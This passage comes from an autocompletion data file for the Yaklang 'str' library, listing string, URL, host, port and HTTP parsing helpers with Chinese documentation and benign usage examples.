              'RegexpMatch(pattern string, s any) bool  doc:RegexpMatch 使用正则尝试匹配字符串，如果匹配成功返回 true，否则返回 false\n\nExample:\n```\nstr.RegexpMatch("^[a-z]+$", "abc") // true\n```\n',
          },
          {
            functionName: "Random(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'Random(s string) string  doc:RandomUpperAndLower 返回一个随机大小写的字符串\n\nExample:\n```\nstr.RandomUpperAndLower("target") // TArGeT\n```\n',
          },
          {
            functionName: "RandStr(${1:n /*type: int*/})",
            document: "",
            definitionStr:
              "RandStr(n int) string  doc:RandStringBytes 返回在大小写字母表中随机挑选 n 个字符组成的字符串\n\nExample:\n```\nstr.RandStr(10)\n```\n",
          },
          {
            functionName: "RandSecret(${1:n /*type: int*/})",
            document: "",
            definitionStr:
              "RandSecret(n int) string  doc:RandSecret 返回在所有可见ascii字符表中随机挑选 n 个字符组成的密码字符串，这个密码经过str.IsStrongPassword验证，即为强密码\n\nExample:\n```\nstr.RandSecret(10)\n```\n",
          },
          {
            functionName: "PathJoin(${1:elem...})",
            document: "",
            definitionStr:
              'PathJoin(elem ...string) (newPath string)  doc:PathJoin 将传入的文件路径进行拼接并返回\n\nExample:\n```\nstr.PathJoin("/var", "www", "html") // in *unix: "/var/www/html"    in Windows: \\var\\www\\html\n```\n',
          },
          {
            functionName:
              "ParseStringUrlToWebsiteRootPath(${1:url /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringUrlToWebsiteRootPath(url string) (newURL string)  doc:ParseStringUrlToWebsiteRootPath 将字符串 url 解析为其根路径的URL\n\nExample:\n```\nstr.ParseStringUrlToWebsiteRootPath("https://yaklang.com/abc?a=1") // https://yaklang.com/\n```\n',
          },
          {
            functionName: "ParseStringUrlToUrlInstance(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringUrlToUrlInstance(s string) (*url.URL, error)  doc:ParseStringUrlToUrlInstance 将字符串 url 解析为 URL 结构体并返回错误\n\nExample:\n```\nstr.ParseStringUrlToUrlInstance("https://yaklang.com/abc?a=1")\n```\n',
          },
          {
            functionName: "ParseStringToUrlsWith3W(${1:sub...})",
            document: "",
            definitionStr:
              'ParseStringToUrlsWith3W(sub ...string) []string  doc:ParseStringToUrlsWith3W 尝试从给定的字符串(ip,域名)中解析出 URL 列表，补全协议和端口，还会补全域名前的 www 前缀\n\nExample:\n```\nstr.ParseStringToUrlsWith3W("yaklang.com:443", "https://yaklang.io") // [https://yaklang.com, https://www.yaklang.com, https://yaklang.io, https://www.yaklang.io]\n```\n',
          },
          {
            functionName: "ParseStringToUrls(${1:targets...})",
            document: "",
            definitionStr:
              'ParseStringToUrls(targets ...string) []string  doc:ParseStringToUrls 尝试从给定的字符串(ip,域名)中解析出 URL 列表，补全协议和端口\n\nExample:\n```\nstr.ParseStringToUrls("yaklang.com:443", "https://yaklang.io") // [https://yaklang.com, https://yaklang.io]\n```\n',
          },
          {
            functionName: "ParseStringToPorts(${1:ports /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringToPorts(ports string) []int  doc:ParseStringToPorts 将字符串解析成 Port 列表， Port 可以以逗号分隔，并且会解析-分隔的范围\n\nExample:\n```\nstr.ParseStringToPorts("10086-10088,23333") // [10086, 10087, 10088, 23333]\n```\n',
          },
          {
            functionName: "ParseStringToLines(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringToLines(raw string) []string  doc:ParseStringToLines 将字符串按换行符(\\n)分割成字符串数组，并去除BOM头和空行\n\nExample:\n```\nstr.ParseStringToLines("Hello World\\nHello Yak") // ["Hello World", "Hello Yak"]\n```\n',
          },
          {
            functionName: "ParseStringToHosts(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringToHosts(raw string) []string  doc:ParseStringToHosts 将字符串解析成 Host 列表， Host 可以以逗号、换行分隔，并且会解析 CIDR 网段\n\nExample:\n```\nstr.ParseStringToHosts("192.168.0.1/32,127.0.0.1") // ["192.168.0.1", "127.0.0.1"]\n```\n',
          },
          {
            functionName: "ParseStringToHostPort(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringToHostPort(raw string) (host string, port int, err error)  doc:ParseStringToHostPort 尝试从字符串中解析出host和port，并与错误一起返回\n\nExample:\n```\nhost, port, err = str.ParseStringToHostPort("127.0.0.1:8888") // host = "127.0.0.1", port = 8888, err = nil\nhost, port, err = str.ParseStringToHostPort("https://example.com") // host = "example.com", port = 443, err = nil\nhost, port, err = str.ParseStringToHostPort("Hello Yak") // host = "", port = 0, err = error("unknown port for [Hello Yak]")\n```\n',
          },
          {
            functionName: "ParseStringToHTTPResponse(${1:res /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringToHTTPResponse(res string) (*http.Response, error)  doc:ParseStringToHTTPResponse 将字符串解析为 HTTP 响应\n\nExample:\n```\nres, err := str.ParseStringToHTTPResponse("HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nok")\n```\n',
          },
          {
            functionName: "ParseStringToHTTPRequest(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringToHTTPRequest(raw string) (*http.Request, error)  doc:ParseStringToHTTPRequest 将字符串解析为 HTTP 请求\n\nExample:\n```\nreq, err = str.ParseStringToHTTPRequest("GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")\n```\n',
          },
          {
            functionName:
              "ParseStringToCClassHosts(${1:targets /*type: string*/})",
            document: "",
            definitionStr:
              'ParseStringToCClassHosts(targets string) string  doc:ParseStringToCClassHosts 尝试从给定的字符串中解析Host，再将其转为 C 类网段，用,分隔\n\nExample:\n```\nstr.ParseStringToCClassHosts("192.168.0.1-255") // 192.168.0.0/24\n```\n',
          },
          {
            functionName: "ParseBytesToHTTPResponse(${1:res /*type: []byte*/})",
            document: "",
            definitionStr:
              'ParseBytesToHTTPResponse(res []byte) (rspInst *http.Response, err error)  doc:ParseBytesToHTTPResponse 将字节数组解析为 HTTP 响应\n\nExample:\n```\nres, err := str.ParseBytesToHTTPResponse(b"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nok")\n```\n',
          },
          {
            functionName: "ParseBytesToHTTPRequest(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              'ParseBytesToHTTPRequest(raw []byte) (reqInst *http.Request, err error)  doc:ParseBytesToHTTPRequest 将字节数组解析为 HTTP 请求\n\nExample:\n```\nreq, err := str.ParseBytesToHTTPRequest(b"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")\n```\n',
          },
          {
            functionName:
              "ParamsGetOr(${1:i /*type: map[string]string*/}, ${2:key /*type: string*/}, ${3:defaultValue /*type: string*/})",
            document: "",
            definitionStr:
              'ParamsGetOr(i map[string]string, key string, defaultValue string) string  doc:ParamsGetOr 从 map 中获取 key 对应的值，如果不存在则返回 defaultValue\n\nExample:\n```\nstr.ParamsGetOr({"a": "1"}, "a", "2") // 1\nstr.ParamsGetOr({"a": "1"}, "b", "2") // 2\n```\n',
          },
          {
            functionName: "NewReader(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              "NewReader(s string) *Reader  doc:NewReader returns a new Reader reading from s.\nIt is similar to bytes.NewBufferString but more efficient and read-only.\n",
          },
          {
            functionName: "NewFilter()",
            document: "",
            definitionStr:
              'NewFilter() *StringFilter  doc:NewFilter 创建一个默认的字符串布谷鸟过滤器，布谷鸟过滤器用于判断一个元素是否在一个集合中，它存在极低的假阳性（即说存在的元素实际上不存在），通常这个集合中的元素数量非常大才会使用布谷鸟过滤器。\n\nExample:\n```\nf = str.NewFilter()\nf.Insert("hello")\nf.Exist("hello") // true\n```\n',
          },
          {
            functionName:
              "MergeUrlFromHTTPRequest(${1:rawRequest /*type: []byte*/}, ${2:target /*type: string*/}, ${3:isHttps /*type: bool*/})",
            document: "",
            definitionStr:
              'MergeUrlFromHTTPRequest(rawRequest []byte, target string, isHttps bool) (newURL string)  doc:MergeUrlFromHTTPRequest 将传入的 target 与 原始 HTTP 请求报文中的 URL 进行合并，并返回合并后的 URL\n\nExample:\n```\nurl = str.MergeUrlFromHTTPRequest(b"GET /z HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n", "/a/b", true) // url = "https://www.yaklang.com/z/a/b"\n```\n',
          },
          {
            functionName: "MatchAnyOfSubString(${1:i}, ${2:subStr...})",
            document: "",
            definitionStr:
              'MatchAnyOfSubString(i any, subStr ...string) bool  doc:MatchAnyOfSubString 尝试将 i 转换为字符串，然后判断是否有任意子串 subStr 存在于 i 中，如果有其中一个子串存在于 i 中则返回 true，否则返回 false，此函数忽略大小写\n\nExample:\n```\nstr.MatchAnyOfSubString("abc", "a", "z", "x") // true\n```\n',
          },
          {
            functionName: "MatchAnyOfRegexp(${1:i}, ${2:re...})",
            document: "",
            definitionStr:
              'MatchAnyOfRegexp(i any, re ...string) bool  doc:MatchAnyOfRegexp 尝试将 i 转换为字符串，然后使用正则表达式匹配，如果任意一个正则表达式匹配成功，则返回 true，否则返回 false\n\nExample:\n```\nstr.MatchAnyOfRegexp("abc", "a.+", "Ab.?", ".?bC") // true\n```\n',
          },
          {
            functionName: "MatchAnyOfGlob(${1:i}, ${2:re...})",
            document: "",
            definitionStr:
              'MatchAnyOfGlob(i any, re ...string) bool  doc:MatchAnyOfGlob 尝试将 i 转换为字符串，然后使用 glob 匹配模式匹配，如果任意一个glob模式匹配成功，则返回 true，否则返回 false\n\nExample:\n```\nstr.MatchAnyOfGlob("abc", "a*", "??b", "[^a-z]?c") // true\n```\n',
          },
          {
            functionName: "MatchAllOfSubString(${1:i}, ${2:subStr...})",
            document: "",
            definitionStr:
              'MatchAllOfSubString(i any, subStr ...string) bool  doc:MatchAllOfSubString 尝试将 i 转换为字符串，然后判断所有子串 subStr 是否都存在于 i 中，如果都存在则返回 true，否则返回 false，此函数忽略大小写\n\nExample:\n```\nstr.MatchAllOfSubString("abc", "a", "b", "c") // true\n```\n',
          },
          {
            functionName: "MatchAllOfRegexp(${1:i}, ${2:re...})",
            document: "",
            definitionStr:
              'MatchAllOfRegexp(i any, re ...string) bool  doc:MatchAllOfRegexp 尝试将 i 转换为字符串，然后使用正则表达式匹配，如果所有的正则表达式都匹配成功，则返回 true，否则返回 false\n\nExample:\n```\nstr.MatchAllOfRegexp("abc", "a.+", ".?b.?", "\\\\w{2}c") // true\n```\n',
          },
          {
            functionName: "MatchAllOfGlob(${1:i}, ${2:re...})",
            document: "",
            definitionStr:
              'MatchAllOfGlob(i any, re ...string) bool  doc:MatchAllOfGlob 尝试将 i 转换为字符串，然后使用 glob 匹配模式匹配，如果所有的glob模式都匹配成功，则返回 true，否则返回 false\n\nExample:\n```\nstr.MatchAllOfGlob("abc", "a*", "?b?", "[a-z]?c") // true\n```\n',
          },
          {
            functionName: "LowerAndTrimSpace(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'LowerAndTrimSpace(raw string) string  doc:LowerAndTrimSpace 将字符串raw转换为小写并去除前后空白字符\n\nExample:\n```\nstr.LowerAndTrimSpace("  Hello  ") // "hello"\n```\n',
          },
          {
            functionName:
              "LastIndexByte(${1:s /*type: string*/}, ${2:c /*type: byte*/})",
            document: "",
            definitionStr:
              "LastIndexByte(s string, c byte) int  doc:LastIndexByte 返回字符串s中最后一个等于c的字符的索引，如果字符串中不存在c，则返回-1\n\nExample:\n```\nstr.LastIndexByte(\"hello yak\", 'l') // 3\nstr.LastIndexByte(\"hello yak\", 'm') // -1\n```\n",
          },
          {
            functionName:
              "LastIndexAny(${1:s /*type: string*/}, ${2:chars /*type: string*/})",
            document: "",
            definitionStr:
              'LastIndexAny(s string, chars string) int  doc:LastIndexAny 返回字符串s中chars任意字符最后一次出现的位置的索引，如果字符串中不存在chars，则返回-1\n\nExample:\n```\nstr.LastIndexAny("hello yak", "ly") // 6\nstr.LastIndexAny("hello yak", "m") // -1\n```\n',
          },
          {
            functionName:
              "LastIndex(${1:s /*type: string*/}, ${2:substr /*type: string*/})",
            document: "",
            definitionStr:
              'LastIndex(s string, substr string) int  doc:LastIndex 返回字符串s中substr最后一次出现的位置的索引，如果字符串中不存在substr，则返回-1\n\nExample:\n```\nstr.LastIndex("hello yak", "l") // 3\nstr.LastIndex("hello yak", "m") // -1\n```\n',
          },
          {
            functionName: "JsonToMapList(${1:line /*type: string*/})",
            document: "",
            definitionStr:
              'JsonToMapList(line string) []map[string]string  doc:JsonToMapList 将 json 字符串 line 解析为 map 列表\n\nExample:\n```\nstr.JsonToMapList(`{"a":1,"b":2} {"c":3, "d":4}`) // [map[a:1 b:2] map[c:3 d:4]]\n```\n',
          },
          {
            functionName: "JsonToMap(${1:line /*type: string*/})",
            document: "",
            definitionStr:
              'JsonToMap(line string) map[string]string  doc:JsonToMap 将 json 字符串 line 解析为 map\n\nExample:\n```\nstr.JsonToMap(`{"a":1,"b":2}`) // map[a:1 b:2]\n```\n',
          },
          {
            functionName: "Join(${1:i}, ${2:d})",
            document: "",
            definitionStr:
              'Join(i any, d any) (defaultResult string)  doc:Join 将i中的元素用d连接，如果传入的参数不是字符串，会自动将其转为字符串，再将其用d连接。如果连接失败，则会返回i的字符串形式。\n\nExample:\n```\nstr.Join([]string{"hello", "yak"}, " ") // hello yak\nstr.Join([]int{1, 2, 3}, " ") // 1 2 3\n```\n',
          },
          {
            functionName: "IsXmlValue(${1:i})",
            document: "",
            definitionStr:
              'IsXmlValue(i any) bool  doc:IsXmlValue 尝试将传入的参数转换为字符串，然后猜测其是否是 XML 格式的数据\n\nExample:\n```\nstr.IsXmlValue("<xml></xml>") // true\nstr.IsXmlValue("<html></html>") // false\n```\n',
          },
          {
            functionName: "IsXmlRequest(${1:i})",
            document: "",
            definitionStr:
              'IsXmlRequest(i any) bool  doc:IsXmlRequest 猜测传入的参数是否为请求头是 XML 格式的原始 HTTP 请求报文\n\nExample:\n```\nstr.IsXmlRequest("POST / HTTP/1.1\\r\\nContent-Type: application/xml\\r\\n\\r\\n<xml></xml>") // true\nstr.IsXmlRequest("POST / HTTP/1.1\\r\\nContent-Type: text/html\\r\\n\\r\\n<html></html>") // false\n```\n',
          },
          {
            functionName:
              "IsXmlParam(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'IsXmlParam(key string, value string) bool  doc:IsXmlParam 根据传入的参数名和参数值猜测是否为 XML 参数\n\nExample:\n```\nstr.IsXmlParam("xml","<xml></xml>") // true，因为参数名为常见的 XML 参数名，且参数值为 XML 格式的字符串\nstr.IsXmlParam("X","<xml></xml>") // true，因为参数值为 XML 格式的字符串\nstr.IsXmlParam("id","1") // false\n```\n',
          },
          {
            functionName: "IsUsernameField(${1:i})",
            document: "",
            definitionStr:
              'IsUsernameField(i any) bool  doc:IsUsernameField 尝试将传入的参数转换为字符串，然后猜测其是否是 username 字段\n\nExample:\n```\nstr.IsUsernameField("username") // true\nstr.IsUsernameField("user") // true\nstr.IsUsernameField("id") // false\n```\n',
          },
          {
            functionName: "IsUrlPath(${1:v})",
            document: "",
            definitionStr:
              "IsUrlPath(v any) bool  doc:根据 value 猜测是否是一个 url path\n",
          },
          {
            functionName:
              "IsUrlParam(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'IsUrlParam(key string, value string) bool  doc:IsUrlParam 根据传入的参数名和参数值猜测是否为 URL 参数\n\nExample:\n```\nstr.IsUrlParam("url","http://www.yaklang.com") // true，因为参数名为常见的 URL 参数名，且参数值为完整的URL\nstr.IsUrlParam("id","1") // false\n```\n',
          },
          {
            functionName:
              "IsTLSServer(${1:addr /*type: string*/}, ${2:proxies...})",
            document: "",
            definitionStr:
              'IsTLSServer(addr string, proxies ...string) bool  doc:IsTLSServer 尝试访问传入的host，然后判断其是否为 TLS 服务。第一个参数为 host，后面可以传入零个或多个参数，为代理地址\n\nExample:\n```\nstr.IsTLSServer("www.yaklang.com:443") // true\nstr.IsTLSServer("www.yaklang.com:80") // false\n```\n',
          },
          {
            functionName: "IsStrongPassword(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'IsStrongPassword(s string) bool  doc:IsStrongPassword 判断字符串是否为强密码，强密码的定义为：长度大于8，同时包含特殊字符、小写字母、大写字母、数字\n\nExample:\n```\nstr.IsStrongPassword("12345678") // false\nstr.IsStrongPassword("12345678a") // false\nstr.IsStrongPassword("12345678aA") // false\nstr.IsStrongPassword("12345678aA!") // true\n```\n',
          },
          {
            functionName: "IsSha256Value(${1:i})",
            document: "",
            definitionStr:
              'IsSha256Value(i any) bool  doc:IsSha256Value 尝试将传入的参数转换为字符串，然后猜测其是否是 SHA256 编码的数据\n\nExample:\n```\nstr.IsSha256Value("a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3") // true\nstr.IsSha256Value("123") // false\n```\n',
          },
          {
            functionName: "IsServerError(${1:i})",
            document: "",
            definitionStr:
              "IsServerError(i any) bool  doc:IsServerError 猜测传入的参数是否为服务器错误\n\nExample:\n```\nstr.IsServerError(`Fatal error: Uncaught Error: Call to undefined function sum() in F:\\xampp\\htdocs\\test.php:7 Stack trace: #0 {main} thrown in <path> on line 7`) // true，这是PHP报错信息\n```\n",
          },
          {
            functionName: "IsSensitiveTokenField(${1:i})",
            document: "",
            definitionStr:
              'IsSensitiveTokenField(i any) bool  doc:IsSensitiveTokenField 尝试将传入的参数转换为字符串，然后猜测其是否是 token 字段\n\nExample:\n```\nstr.IsSensitiveTokenField("token") // true\nstr.IsSensitiveTokenField("access_token") // true\nstr.IsSensitiveTokenField("id") // false\n```\n',
          },
          {
            functionName: "IsSensitiveJson(${1:i})",
            document: "",
            definitionStr:
              'IsSensitiveJson(i any) bool  doc:IsSensitiveJson  尝试将传入的参数转换为字符串，然后猜测其是否为敏感的 JSON 数据\n\nExample:\n```\nstr.IsSensitiveJson(`{"password":"123456"}`) // true\nstr.IsSensitiveJson(`{"uid": 10086}`) // true\nstr.IsSensitiveJson(`{"id": 1}`) // false\n```\n',
          },
          {
            functionName: "IsSQLColumnField(${1:i})",
            document: "",
            definitionStr:
              'IsSQLColumnField(i any) bool  doc:IsSQLColumnField 尝试将传入的参数转换为字符串，然后猜测其是否是 SQL 查询字段\n\nExample:\n```\nstr.IsSQLColumnField("sort") // true\nstr.IsSQLColumnField("order") // true\nstr.IsSQLColumnField("id") // false\n```\n',
          },
          {
            functionName:
              "IsRedirectParam(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'IsRedirectParam(key string, value string) bool  doc:IsRedirectParam 根据传入的参数名和参数值猜测是否为重定向参数\n\nExample:\n```\nstr.IsRedirectParam("to","http://www.yaklang.com") // true，因为参数值为完整的 URL\nstr.IsRedirectParam("target","/index.php") // true，因为参数值为一个 URL 路径而且参数名为常见的跳转的参数名\nstr.IsRedirectParam("id", "1") // false\n```\n',
          },
          {
            functionName: "IsPlainBase64Value(${1:i})",
            document: "",
            definitionStr:
              'IsPlainBase64Value(i any) bool  doc:IsPlainBase64Value 尝试将传入的参数转换为字符串，然后猜测其是否是 Base64 编码的数据，它相比于 IsBase64Value 多了一层判断，即判断 base64 解码后的数据是否为可见字符串\n\nExample:\n```\nstr.IsPlainBase64Value("MTI=") // true\nstr.IsPlainBase64Value("Aw==") // false\n```\n',
          },
          {
            functionName: "IsPasswordField(${1:i})",
            document: "",
            definitionStr:
              'IsPasswordField(i any) bool  doc:IsPasswordField 尝试将传入的参数转换为字符串，然后猜测其是否是 password 字段\n\nExample:\n```\nstr.IsPasswordField("password") // true\nstr.IsPasswordField("pwd") // true\nstr.IsPasswordField("id") // false\n```\n',
          },
          {
            functionName: "IsMD5Value(${1:i})",
            document: "",
            definitionStr:
              'IsMD5Value(i any) bool  doc:IsMD5Value 尝试将传入的参数转换为字符串，然后猜测其是否是 MD5 编码的数据\n\nExample:\n```\nstr.IsMD5Value("202cb962ac59075b964b07152d234b70") // true\nstr.IsMD5Value("123") // false\n```\n',
          },
          {
            functionName: "IsJsonResponse(${1:i})",
            document: "",
            definitionStr:
              'IsJsonResponse(i any) bool  doc:IsJsonResponse 尝试将传入的参数转换为字符串，然后猜测传入的参数是否为 JSON 格式的原始 HTTP 响应报文，这是通过判断Content-Type请求头实现的\n\nExample:\n```\nstr.IsJsonResponse("HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\n\\r\\n{\\"code\\": 0}") // true\nstr.IsJsonResponse("HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\nhello") // false\n```\n',
          },
          {
            functionName:
              "IsJSONPParam(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'IsJSONPParam(key string, value string) bool  doc:IsJSONPParam 根据传入的参数名和参数值猜测是否为 JSONP 参数\n\nExample:\n```\nstr.IsJSONPParam("callback","jquery1.0.min.js") // true，因为参数名为常见的 JSONP 参数名，且参数值为常见的JS文件名\nstr.IsJSONPParam("f","jquery1.0.min.js") // true，因为参数值为常见的 JS 文件名\nstr.IsJSONPParam("id","1") // false\n```\n',
          },
          {
            functionName: "IsIPv6(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'IsIPv6(raw string) bool  doc:IsIPv6 判断字符串是否是 IPv6 地址\n\nExample:\n```\nstr.IsIPv6("::1") // true\nstr.IsIPv6("127.0.0.1") // false\n```\n',
          },
          {
            functionName: "IsIPv4(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              'IsIPv4(raw string) bool  doc:IsIPv4 判断字符串是否是 IPv4 地址\n\nExample:\n```\nstr.IsIPv4("::1") // false\nstr.IsIPv4("127.0.0.1") // true\n```\n',
          },
          {
            functionName: "IsHttpURL(${1:v})",
            document: "",
            definitionStr:
              "IsHttpURL(v any) bool  doc:IsFullURL 根据 value 猜测是否是一个完整 url，目前只关心 http 和 https\n",
          },
          {
            functionName: "IsHtmlResponse(${1:i})",
            document: "",
            definitionStr:
              'IsHtmlResponse(i any) bool  doc:IsHtmlResponse 猜测传入的参数是否为原始 HTTP 响应报文\n\nExample:\n```\nstr.IsHtmlResponse("HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html></html>") // true\nresp, _ = str.ParseStringToHTTPResponse("HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html></html>")\nstr.IsHtmlResponse(resp) // true\n```\n',
          },
          {
            functionName: "IsDigit(${1:i})",
            document: "",
            definitionStr:
              'IsDigit(i any) bool  doc:IsDigit 尝试将传入的参数转换为字符串，然后判断其是否都由数字组成\n\nExample:\n```\nstr.IsDigit("123") // true\nstr.IsDigit("abc123") // false\n```\n',
          },
          {
            functionName: "IsCaptchaField(${1:i})",
            document: "",
            definitionStr:
              'IsCaptchaField(i any) bool  doc:IsCaptchaField 尝试将传入的参数转换为字符串，然后猜测其是否是验证码字段\n\nExample:\n```\nstr.IsCaptchaField("captcha") // true\nstr.IsCaptchaField("code_img") // true\nstr.IsCaptchaField("id") // false\n```\n',
          },
          {
            functionName: "IsBase64Value(${1:i})",
            document: "",
            definitionStr:
              'IsBase64Value(i any) bool  doc:IsBase64Value 尝试将传入的参数转换为字符串，然后猜测其是否是 Base64 编码的数据\n\nExample:\n```\nstr.IsBase64Value("MTI=") // true\nstr.IsBase64Value("123") // false\n```\n',
          },
          {
            functionName: "IsAlphaNum(${1:i})",
            document: "",
            definitionStr:
              'IsAlphaNum(i any) bool  doc:IsAlphaNum / IsAlNum 尝试将传入的参数转换为字符串，然后判断其是否都由英文字母和数字组成\n\nExample:\n```\nstr.IsAlphaNum("abc123") // true\nstr.IsAlphaNum("abc123!") // false\n```\n',
          },
          {
            functionName: "IsAlpha(${1:i})",
            document: "",
            definitionStr:
              'IsAlpha(i any) bool  doc:IsAlpha 尝试将传入的参数转换为字符串，然后判断其是否都由英文字母组成\n\nExample:\n```\nstr.IsAlpha("abc") // true\nstr.IsAlpha("abc123") // false\n```\n',
          },
          {
            functionName: "IsAlNum(${1:i})",
            document: "",
            definitionStr:
              'IsAlNum(i any) bool  doc:IsAlphaNum / IsAlNum 尝试将传入的参数转换为字符串，然后判断其是否都由英文字母和数字组成\n\nExample:\n```\nstr.IsAlphaNum("abc123") // true\nstr.IsAlphaNum("abc123!") // false\n```\n',
          },
          {
            functionName:
              "IntersectString(${1:x /*type: []string*/}, ${2:y /*type: []string*/})",
            document: "",
            definitionStr:
              'IntersectString(x []string, y []string) []string  doc:Intersect / IntersectString 返回两个字符串切片之间的交集\n\nExample:\n```\nstr.Intersect(["1", "2", "3"], ["3", "4", "5"]) // ["3"]\n```\n',
          },
          {
            functionName:
              "Intersect(${1:x /*type: []string*/}, ${2:y /*type: []string*/})",
            document: "",
            definitionStr:
              'Intersect(x []string, y []string) []string  doc:Intersect / IntersectString 返回两个字符串切片之间的交集\n\nExample:\n```\nstr.Intersect(["1", "2", "3"], ["3", "4", "5"]) // ["3"]\n```\n',
          },
          {
            functionName:
              "IndexByte(${1:s /*type: string*/}, ${2:c /*type: byte*/})",
            document: "",
            definitionStr:
              "IndexByte(s string, c byte) int  doc:IndexByte 返回字符串s中第一个等于c的字符的索引，如果字符串中不存在c，则返回-1\n\nExample:\n```\nstr.IndexByte(\"hello yak\", 'y') // 6\nstr.IndexByte(\"hello yak\", 'm') // -1\n```\n",
          },
          {
            functionName:
              "IndexAny(${1:s /*type: string*/}, ${2:chars /*type: string*/})",
            document: "",
            definitionStr:
              'IndexAny(s string, chars string) int  doc:IndexAny 返回字符串s中chars任意字符首次出现的位置的索引，如果字符串中不存在chars，则返回-1\n\nExample:\n```\nstr.IndexAny("Hello world", "world") // 2，因为l在第三个字符中首次出现\nstr.IndexAny("Hello World", "Yak") // -1\n```\n',
          },
          {
            functionName:
              "Index(${1:s /*type: string*/}, ${2:substr /*type: string*/})",
            document: "",
            definitionStr:
              'Index(s string, substr string) int  doc:Index 返回字符串s中substr第一次出现的位置的索引，如果字符串中不存在substr，则返回-1\n\nExample:\n```\nstr.Index("hello yak", "yak") // 6\nstr.Index("hello world", "yak") // -1\n```\n',
          },
          {
            functionName: "IPv4ToCClassNetwork(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'IPv4ToCClassNetwork(s string) (network string, err error)  doc:IPv4ToCClassNetwork 尝试从一个 IPv4 地址中获取 C 类网络地址，并返回错误\n\nExample:\n```\nnetwork, err = str.IPv4ToCClassNetwork("192.168.0.1") // network = "192.168.0.0/24", err = nil\n```\n',
          },
          {
            functionName: "HostPort(${1:host /*type: string*/}, ${2:port})",
            document: "",
            definitionStr:
              'HostPort(host string, port any) string  doc:HostPort 将 host 和 port 拼接成 host:port 的形式\n\nExample:\n```\nstr.HostPort("yaklang.com", 443) // yaklang.com:443\n```\n',
          },
          {
            functionName:
              "HasSuffix(${1:s /*type: string*/}, ${2:suffix /*type: string*/})",
            document: "",
            definitionStr:
              'HasSuffix(s string, suffix string) bool  doc:EndsWith / HasSuffix 判断字符串s是否以suffix结尾\n\nExample:\n```\nstr.EndsWith("Hello Yak", "Yak") // true\nstr.EndsWith("Hello Yak", "Hello") // false\n```\n',
          },
          {
            functionName:
              "HasPrefix(${1:s /*type: string*/}, ${2:prefix /*type: string*/})",
            document: "",
            definitionStr:
              'HasPrefix(s string, prefix string) bool  doc:StartsWith / HasPrefix 判断字符串s是否以prefix开头\n\nExample:\n```\nstr.StartsWith("Hello Yak", "Hello") // true\nstr.StartsWith("Hello Yak", "Yak") // false\n```\n',
          },
          {
            functionName:
              "Grok(${1:line /*type: string*/}, ${2:rule /*type: string*/})",
            document: "",
            definitionStr:
              'Grok(line string, rule string) GrokResult  doc:Grok 用于将字符串 line 使用 Grok 以规则 rule 进行解析，并返回解析结果(map)，参考 https://doc.yonyoucloud.com/doc/logstash-best-practice-cn/filter/grok.html 获取更多信息。\n\nExample:\n```\nstr.Grok("04/18-00:59:45.385191", "%{MONTHNUM:month}/%{MONTHDAY:day}-%{TIME:time}") // map[HOUR:[00] MINUTE:[59] SECOND:[45.385191] day:[18] month:[04] time:[00:59:45.385191]]\n```\n',
          },
          {
            functionName: "FixHTTPResponse(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              'FixHTTPResponse(raw []byte) (rsp []byte, body []byte, _ error)  doc:FixHTTPResponse 尝试对传入的响应进行修复，并返回修复后的响应，响应体和错误\n\nExample:\n```\nfixedResponse, body, err = str.FixHTTPResponse(b"HTTP/1.1 200 OK\\r\\nContent-Type: text/html; charset=gbk\\r\\n\\r\\n<html>你好</html>")\n```\n',
          },
          {
            functionName: "FixHTTPRequest(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              'FixHTTPRequest(raw []byte) []byte  doc:FixHTTPRequest 尝试对传入的HTTP请求报文进行修复，并返回修复后的请求\n\nExample:\n```\nstr.FixHTTPRequest(b"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")\n```\n',
          },
          {
            functionName:
              "FilterPorts(${1:sourcePorts /*type: string*/}, ${2:excludePorts /*type: string*/})",
            document: "",
            definitionStr:
              'FilterPorts(sourcePorts string, excludePorts string) []int  doc:FilterPorts 接受两个字符串形式的端口列表作为参数，返回一个新的端口列表，\n\n其中包含了在 `ports1` 中但不在 `ports2` 中的所有端口。\n\n这个函数首先将两个输入字符串解析为端口列表，然后创建一个映射（或集合）来存储 `ports2` 中的所有端口。\n\n然后，它遍历 `ports1` 中的每个端口，如果这个端口不在 `ports2` 中，那么它就会被添加到结果列表中。\n\n最后，函数返回结果列表，其中包含了所有只在 `ports1` 中出现的端口。\n\nExample:\n```\nFilterPorts("1-10", "2-10") // [1]\n```\n',
          },
          {
            functionName: "Fields(${1:s /*type: string*/})",
            document: "",
            definitionStr:
